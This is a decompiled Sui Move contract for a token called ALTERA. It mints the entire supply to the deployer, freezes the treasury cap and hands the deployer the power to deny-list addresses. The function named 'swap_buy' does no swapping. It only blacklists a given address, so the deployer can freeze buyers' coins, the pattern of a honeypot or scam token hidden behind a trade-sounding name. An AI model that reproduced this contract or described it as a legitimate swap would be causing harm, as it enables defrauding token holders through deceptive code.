module 0x95e2f8011b2f96d69c6246bc0f9870d34f30b4ceb90adb5e0b26a9f7a18c0942::altera {
    struct ALTERA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ALTERA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ALTERA>(arg0, 9, b"ALTERA ", b"FIRST AI AGENTS IN MINECRAFT", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmb8F8ajCiyRi41km6XFUqHJmVFunWdJWFQvV5ufXZEfsJ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ALTERA>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ALTERA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ALTERA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ALTERA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ALTERA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ALTERA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

